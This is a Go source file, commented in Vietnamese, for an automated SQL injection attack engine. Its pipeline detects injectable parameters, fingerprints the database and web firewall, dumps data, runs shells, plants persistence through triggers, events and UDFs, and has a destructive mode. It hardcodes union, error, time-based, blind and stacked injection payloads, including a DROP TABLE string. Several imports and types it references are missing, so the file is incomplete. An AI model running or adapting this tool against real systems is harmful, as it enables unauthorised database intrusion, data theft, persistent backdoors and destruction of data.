package cmd

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/go-resty/resty/v2"
	"go.uber.org/zap"
)

type Session struct {
	ID          string            `json:"id"`
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Data        string            `json:"data"`
	Param       string            `json:"param"`
	Headers     map[string]string `json:"headers"`
	Cookies     map[string]string `json:"cookies"`
	Injection   *InjectionPoint   `json:"injection,omitempty"`
	DBMS        *DBMSInfo         `json:"dbms,omitempty"`
	CreatedAt   time.Time         `json:"created_at"`
	UpdatedAt   time.Time         `json:"updated_at"`
	State       map[string]interface{} `json:"state"`
}

type InjectionPoint struct {
	Parameter     string   `json:"parameter"`
	Type          string   `json:"type"`           // GET, POST, COOKIE, HEADER
	Technique     string   `json:"technique"`      // union, blind, time, error, stacked
	DBMS          string   `json:"dbms"`           // mysql, postgres, mssql, oracle, sqlite
	Confidence    float64  `json:"confidence"`
	Payload       string   `json:"payload"`
	Prefix        string   `json:"prefix"`
	Suffix        string   `json:"suffix"`
	Comment       string   `json:"comment"`
	IsStackable   bool     `json:"is_stackable"`
	RequiresQuote bool     `json:"requires_quote"`
}

type DBMSInfo struct {
	Type       string `json:"type"`
	Version    string `json:"version"`
	Comment    string `json:"comment"`
	Functions  []string `json:"functions"`
	Privileges []string `json:"privileges"`
}

type EngineOptions struct {
	Auto          bool
	FullPipeline  bool
	DestructMode  string
	Threads       int
	TamperChain   []string
}

type EngineResult struct {
	Session       *Session        `json:"session"`
	Detection     *DetectionResult `json:"detection,omitempty"`
	Exfiltration  *ExfilResult     `json:"exfiltration,omitempty"`
	Shell         *ShellResult     `json:"shell,omitempty"`
	Persistence   *PersistResult   `json:"persistence,omitempty"`
	Destruction   *DestructResult  `json:"destruction,omitempty"`
	Errors        []string         `json:"errors,omitempty"`
}

func NewSession(targetURL, method, data, param string, headers, cookies []string) *Session {
	h := make(map[string]string)
	for _, hv := range headers {
		parts := strings.SplitN(hv, ":", 2)
		if len(parts) == 2 {
			h[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	
	c := make(map[string]string)
	for _, cv := range cookies {
		parts := strings.SplitN(cv, "=", 2)
		if len(parts) == 2 {
			c[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}
	
	return &Session{
		ID:        uuid.New().String(),
		URL:       targetURL,
		Method:    strings.ToUpper(method),
		Data:      data,
		Param:     param,
		Headers:   h,
		Cookies:   c,
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
		State:     make(map[string]interface{}),
	}
}

func LoadSession(file string) (*Session, error) {
	data, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}
	var s Session
	err = json.Unmarshal(data, &s)
	return &s, err
}

func (s *Session) Save(file string) error {
	s.UpdatedAt = time.Now()
	data, err := json.MarshalIndent(s, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(file, data, 0644)
}

func (s *Session) GetClient() *resty.Client {
	client := resty.New().
		SetTimeout(30 * time.Second).
		SetRedirectPolicy(resty.FlexibleRedirectPolicy(10)).
		SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
		SetHeader("User-Agent", viper.GetString("engine.user_agent"))
	
	if proxy := viper.GetString("engine.proxy"); proxy != "" {
		client.SetProxy(proxy)
	}
	
	for k, v := range s.Headers {
		client.SetHeader(k, v)
	}
	for k, v := range s.Cookies {
		client.SetCookie(&http.Cookie{Name: k, Value: v})
	}
	
	return client
}

type Engine struct{}

func NewEngine() *Engine {
	return &Engine{}
}

func (e *Engine) Run(ctx context.Context, session *Session, opts EngineOptions) (*EngineResult, error) {
	result := &EngineResult{Session: session}
	
	// Giai đoạn 1: Phát hiện
	detector := NewDetector()
	detectResult, err := detector.Detect(ctx, session)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("phát hiện: %v", err))
	} else {
		result.Detection = detectResult
		session.Injection = detectResult.InjectionPoint
		session.DBMS = detectResult.DBMSInfo
		session.Save(fmt.Sprintf("session_%s.json", session.ID))
	}
	
	if session.Injection == nil {
		return result, fmt.Errorf("không tìm thấy điểm tiêm")
	}
	
	// Giai đoạn 2: Trích xuất
	if opts.Auto || opts.FullPipeline {
		dumper := NewDumper()
		exfilResult, err := dumper.Dump(ctx, session, DumpOptions{Format: "json"})
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("trích xuất: %v", err))
		} else {
			result.Exfiltration = exfilResult
		}
	}
	
	// Giai đoạn 3: Shell
	if opts.FullPipeline {
		shell := NewShell()
		shellResult, err := shell.Execute(ctx, session, ShellOptions{Interactive: false, Type: "oneshot"})
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("shell: %v", err))
		} else {
			result.Shell = shellResult
		}
	}
	
	// Giai đoạn 4: Duy trì
	if opts.FullPipeline {
		persist := NewPersistence()
		persistResult, err := persist.Establish(ctx, session, PersistOptions{Methods: []string{"trigger", "event", "udf_autoload"}})
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("duy trì: %v", err))
		} else {
			result.Persistence = persistResult
		}
	}
	
	// Giai đoạn 5: Phá hủy
	if opts.DestructMode != "none" && opts.DestructMode != "" {
		destruct := NewDestructor()
		destructResult, err := destruct.Execute(ctx, session, DestructOptions{
			Mode:     opts.DestructMode,
			Database: "",
			Table:    "",
		})
		if err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("phá hủy: %v", err))
		} else {
			result.Destruction = destructResult
		}
	}
	
	return result, nil
}

type DetectionResult struct {
	InjectionPoint *InjectionPoint `json:"injection_point"`
	DBMSInfo       *DBMSInfo       `json:"dbms_info"`
	WAFDetected    string          `json:"waf_detected,omitempty"`
	Techniques     []string        `json:"techniques"`
}

type Detector struct{}

func NewDetector() *Detector {
	return &Detector{}
}

func (d *Detector) Detect(ctx context.Context, session *Session) (*DetectionResult, error) {
	client := session.GetClient()
	
	// Kiểm tra các tham số để tìm điểm tiêm
	params := d.getTestParameters(session)
	
	var injection *InjectionPoint
	var dbms *DBMSInfo
	var wafDetected string
	techniques := []string{}
	
	for _, param := range params {
		// Kiểm tra từng kỹ thuật
		for _, tech := range []string{"union", "error", "time", "blind", "stacked"} {
			if inj := d.testTechnique(ctx, client, session, param, tech); inj != nil {
				injection = inj
				techniques = append(techniques, tech)
				
				// Nhận diện DBMS
				dbms = d.fingerprintDBMS(ctx, client, session, injection)
				break
			}
		}
		if injection != nil {
			break
		}
	}
	
	// Phát hiện WAF
	wafDetected = d.detectWAF(ctx, client, session)
	
	return &DetectionResult{
		InjectionPoint: injection,
		DBMSInfo:       dbms,
		WAFDetected:    wafDetected,
		Techniques:     techniques,
	}, nil
}

func (d *Detector) getTestParameters(session *Session) []TestParam {
	var params []TestParam
	
	// Tham số URL
	if u, err := url.Parse(session.URL); err == nil {
		for k := range u.Query() {
			params = append(params, TestParam{Name: k, Type: "GET", Value: u.Query().Get(k)})
		}
	}
	
	// Dữ liệu POST
	if session.Method == "POST" && session.Data != "" {
		if strings.Contains(session.Data, "=") {
			for _, pair := range strings.Split(session.Data, "&") {
				kv := strings.SplitN(pair, "=", 2)
				if len(kv) == 2 {
					params = append(params, TestParam{Name: kv[0], Type: "POST", Value: kv[1]})
				}
			}
		} else if session.Param != "" {
			params = append(params, TestParam{Name: session.Param, Type: "POST", Value: session.Data})
		}
	}
	
	// Cookie
	for k, v := range session.Cookies {
		params = append(params, TestParam{Name: k, Type: "COOKIE", Value: v})
	}
	
	// Header
	for k, v := range session.Headers {
		if strings.ToLower(k) == "user-agent" || strings.ToLower(k) == "referer" || strings.ToLower(k) == "x-forwarded-for" {
			params = append(params, TestParam{Name: k, Type: "HEADER", Value: v})
		}
	}
	
	return params
}

type TestParam struct {
	Name  string
	Type  string
	Value string
}

func (d *Detector) testTechnique(ctx context.Context, client *resty.Client, session *Session, param TestParam, technique string) *InjectionPoint {
	// Nạp payload cho kỹ thuật và DBMS
	payloads := getPayloads(technique, "")
	
	for _, payload := range payloads {
		resp, err := d.sendPayload(client, session, param, payload)
		if err != nil {
			continue
		}
		
		if d.isVulnerable(resp, technique) {
			return &InjectionPoint{
				Parameter: param.Name,
				Type:      param.Type,
				Technique: technique,
				DBMS:      "", // Sẽ được nhận diện ở bước fingerprint
				Confidence: 0.9,
				Payload:   payload,
				Prefix:    "",
				Suffix:    "",
				Comment:   getComment(""),
			}
		}
	}
	return nil
}

func (d *Detector) fingerprintDBMS(ctx context.Context, client *resty.Client, session *Session, inj *InjectionPoint) *DBMSInfo {
	// Kiểm tra payload theo từng DBMS
	dbmsTypes := []string{"mysql", "postgres", "mssql", "oracle", "sqlite"}
	
	for _, dbms := range dbmsTypes {
		payloads := getPayloads("fingerprint", dbms)
		for _, payload := range payloads {
			resp, _ := d.sendPayload(client, session, TestParam{Name: inj.Parameter, Type: inj.Type, Value: ""}, payload)
			if d.isDBMSMatch(resp, dbms) {
				return &DBMSInfo{
					Type:    dbms,
					Version: d.extractVersion(ctx, client, session, inj, dbms),
					Comment: getComment(dbms),
				}
			}
		}
	}
	return &DBMSInfo{Type: "unknown"}
}

func (d *Detector) detectWAF(ctx context.Context, client *resty.Client, session *Session) string {
	// Gửi payload kiểm thử và phân tích phản hồi
	wafSignatures := map[string][]string{
		"cloudflare":     {"cloudflare", "cf-ray", "__cfduid", "attention required"},
		"akamai":         {"akamai", "ak_bmsc", "bm-sz", "_abck"},
		"imperva":        {"imperva", "incapsula", "visid_incap", "nlbi_"},
		"f5":             {"f5", "bigip", "ts", "ASINFO"},
		"modsecurity":    {"mod_security", "modsecurity", "no script"},
		"aws_waf":        {"aws", "awselb", "x-amzn"},
		"sucuri":         {"sucuri", "cloudproxy"},
		"barracuda":      {"barracuda", "barra"},
	}
	
	for waf, sigs := range wafSignatures {
		resp, _ := client.R().Get(session.URL)
		body := strings.ToLower(resp.String())
		headers := resp.Header()
		
		for _, sig := range sigs {
			if strings.Contains(body, sig) {
				for k := range headers {
					if strings.Contains(strings.ToLower(k), sig) || strings.Contains(strings.ToLower(headers.Get(k)), sig) {
						return waf
					}
				}
			}
		}
	}
	return ""
}

func (d *Detector) sendPayload(client *resty.Client, session *Session, param TestParam, payload string) (*resty.Response, error) {
	req := client.R()
	
	switch param.Type {
	case "GET":
		u, _ := url.Parse(session.URL)
		q := u.Query()
		q.Set(param.Name, payload)
		u.RawQuery = q.Encode()
		return req.Get(u.String())
	case "POST":
		data := session.Data
		if strings.Contains(data, "=") {
			pairs := strings.Split(data, "&")
			for i, p := range pairs {
				kv := strings.SplitN(p, "=", 2)
				if len(kv) == 2 && kv[0] == param.Name {
					pairs[i] = param.Name + "=" + payload
				}
			}
			data = strings.Join(pairs, "&")
		} else {
			data = param.Name + "=" + payload
		}
		return req.SetBody(data).Post(session.URL)
	case "COOKIE":
		req.SetCookie(&http.Cookie{Name: param.Name, Value: payload})
		return req.Get(session.URL)
	case "HEADER":
		req.SetHeader(param.Name, payload)
		return req.Get(session.URL)
	}
	return nil, fmt.Errorf("kiểu tham số không được hỗ trợ: %s", param.Type)
}

func (d *Detector) isVulnerable(resp *resty.Response, technique string) bool {
	body := resp.String()
	status := resp.StatusCode()
	time := resp.Time()
	
	switch technique {
	case "union":
		return status == 200 && (strings.Contains(body, "SQLI_TEST") || d.detectUnionColumns(body))
	case "error":
		return d.detectSQLErrors(body)
	case "time":
		return time > 5*time.Second
	case "blind":
		return d.detectBooleanDifference(body)
	case "stacked":
		return status == 200
	}
	return false
}

func (d *Detector) detectUnionColumns(body string) bool {
	// Heuristic: tìm các mẫu dữ liệu
	return len(body) > 100
}

func (d *Detector) detectSQLErrors(body string) bool {
	errors := []string{
		"sql syntax", "mysql_fetch", "ora-", "postgresql", "pg_",
		"sqlite3", "microsoft ole db", "odbc", "jdbc",
		"syntax error", "unterminated", "unclosed quotation",
		"division by zero", "conversion failed",
	}
	bodyLower := strings.ToLower(body)
	for _, err := range errors {
		if strings.Contains(bodyLower, err) {
			return true
		}
	}
	return false
}

func (d *Detector) detectBooleanDifference(body string) bool {
	// So sánh với baseline
	return false
}

func (d *Detector) isDBMSMatch(resp *resty.Response, dbms string) bool {
	body := strings.ToLower(resp.String())
	signatures := map[string][]string{
		"mysql":    {"mysql", "mariadb", "you have an error in your sql syntax"},
		"postgres": {"postgresql", "pg_", "syntax error at or near"},
		"mssql":    {"microsoft sql server", "sqlserver", "unclosed quotation mark"},
		"oracle":   {"oracle", "ora-", "pl/sql"},
		"sqlite":   {"sqlite", "sqlite3"},
	}
	for _, sig := range signatures[dbms] {
		if strings.Contains(body, sig) {
			return true
		}
	}
	return false
}

func (d *Detector) extractVersion(ctx context.Context, client *resty.Client, session *Session, inj *InjectionPoint, dbms string) string {
	payloads := getPayloads("version", dbms)
	for _, payload := range payloads {
		resp, _ := d.sendPayload(client, session, TestParam{Name: inj.Parameter, Type: inj.Type, Value: ""}, payload)
		if version := parseVersion(resp.String(), dbms); version != "" {
			return version
		}
	}
	return "unknown"
}

func parseVersion(body, dbms string) string {
	// Trích xuất phiên bản từ phản hồi
	return ""
}

func getPayloads(technique, dbms string) []string {
	// Nạp từ signatures/payloads/
	payloadsMap := map[string]map[string][]string{
		"union": {
			"": {"' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--"},
		},
		"error": {
			"mysql":    {"' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--", "' AND UPDATEXML(1, CONCAT(0x7e, VERSION(), 0x7e), 1)--"},
			"postgres": {"' AND CAST(VERSION() AS INT)--", "' AND 1=CAST(VERSION() AS INT)--"},
			"mssql":    {"' AND 1=CONVERT(INT, @@VERSION)--"},
			"oracle":   {"' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT VERSION FROM V$INSTANCE))--"},
		},
		"time": {
			"mysql":    {"' AND (SELECT SLEEP(5))--", "' OR (SELECT SLEEP(5))--"},
			"postgres": {"' AND (SELECT pg_sleep(5))--"},
			"mssql":    {"' WAITFOR DELAY '0:0:5'--"},
			"oracle":   {"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RCE',5)--"},
		},
		"blind": {
			"": {"' AND 1=1--", "' AND 1=2--", "\" AND 1=1--", "\" AND 1=2--"},
		},
		"stacked": {
			"mysql":    {"'; DROP TABLE test--", "; SELECT SLEEP(5)--"},
			"postgres": {"'; SELECT pg_sleep(5)--"},
			"mssql":    {"'; WAITFOR DELAY '0:0:5'--"},
		},
		"fingerprint": {
			"mysql":    {"' AND (SELECT 1 FROM DUAL)--"},
			"postgres": {"' AND (SELECT 1)--"},
			"mssql":    {"' AND (SELECT 1)--"},
			"oracle":   {"' AND (SELECT 1 FROM DUAL)--"},
			"sqlite":   {"' AND (SELECT 1)--"},
		},
		"version": {
			"mysql":    {"' UNION SELECT @@VERSION--"},
			"postgres": {"' UNION SELECT VERSION()--"},
			"mssql":    {"' UNION SELECT @@VERSION--"},
			"oracle":   {"' UNION SELECT BANNER FROM V$VERSION--"},
			"sqlite":   {"' UNION SELECT SQLITE_VERSION()--"},
		},
	}
	
	if tech, ok := payloadsMap[technique]; ok {
		if dbms != "" {
			if p, ok := tech[dbms]; ok {
				return p
			}
		}
		if p, ok := tech[""]; ok {
			return p
		}
	}
	return []string{}
}

func getComment(dbms string) string {
	comments := map[string]string{
		"mysql":    "-- ",
		"postgres": "-- ",
		"mssql":    "-- ",
		"oracle":   "-- ",
		"sqlite":   "-- ",
	}
	if c, ok := comments[dbms]; ok {
		return c
	}
	return "-- "
}
